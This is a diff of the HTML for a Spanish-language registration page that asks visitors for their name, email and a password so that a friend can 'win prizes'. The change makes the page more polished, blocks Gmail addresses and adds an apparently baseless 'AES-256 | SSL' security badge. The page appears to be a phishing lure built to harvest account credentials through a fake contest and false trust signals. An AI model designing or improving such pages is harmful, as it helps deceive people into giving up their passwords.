@@ -2,44 +2,55 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro de Apoyo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Registro Premium | Apoya a tu Amigo</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
 </head>
 <body>
-    <div class="fondo-concurso"></div>
+    <div class="fondo-dinamico"></div>
     
-    <main class="contenedor-principal">
-        <div class="tarjeta-registro">
-            <div class="encabezado">
-                <div class="icono-confeti">🎉</div>
-                <h1>¡Regístrate para que tu amigo<br><span>gane premios increíbles!</span></h1>
-                <p class="subtitulo">Aumenta sus posibilidades de ganar</p>
+    <main class="contenedor">
+        <div class="tarjeta-elevada">
+            <div class="cabecera">
+                <div class="icono-3d animate__animated animate__bounceIn">🎁</div>
+                <h1 class="titulo-gradiente">Potencia las oportunidades<br>de tu amigo</h1>
+                <p class="subtitulo-neon">Registro rápido y seguro</p>
             </div>
 
-            <form id="formularioRegistro">
-                <div class="grupo-input">
-                    <label>👤 Nombre completo</label>
-                    <input type="text" id="nombre" placeholder="Ej: Luis García" required>
+            <form id="formRegistro" class="formulario-moderno">
+                <div class="grupo-formulario">
+                    <label class="etiqueta-flotante">Nombre completo</label>
+                    <input type="text" id="nombre" class="input-material" required>
+                    <span class="icono-input">👤</span>
                 </div>
 
-                <div class="grupo-input">
-                    <label>📩 Correo electrónico</label>
-                    <input type="email" id="correo" placeholder="tucorreo@ejemplo.com" required>
-                    <div class="error-email" id="errorEmail">✖ No se permiten cuentas Gmail</div>
+                <div class="grupo-formulario">
+                    <label class="etiqueta-flotante">Correo electrónico</label>
+                    <input type="email" id="correo" class="input-material" required>
+                    <span class="icono-input">📩</span>
+                    <div class="mensaje-error" id="errorEmail">
+                        <span class="icono-error">⛔</span> Dominios Gmail no permitidos
+                    </div>
                 </div>
 
-                <div class="grupo-input">
-                    <label>🔒 Crea una contraseña</label>
-                    <input type="password" id="password" placeholder="••••••••" required>
+                <div class="grupo-formulario">
+                    <label class="etiqueta-flotante">Contraseña</label>
+                    <input type="password" id="password" class="input-material" required>
+                    <span class="icono-input">🔒</span>
                 </div>
 
-                <button type="submit" class="boton-registro">
-                    <span class="texto-boton">¡Registrarme ahora!</span>
-                    <span class="icono-boton">🚀</span>
+                <button type="submit" class="boton-neumorfico">
+                    <span class="texto-boton">Validar Registro</span>
+                    <div class="carga-efecto"></div>
                 </button>
             </form>
+
+            <div class="info-seguridad">
+                <div class="icono-escudo">🛡️</div>
+                <p>Cifrado AES-256 | Certificado SSL</p>
+            </div>
         </div>
     </main>
 
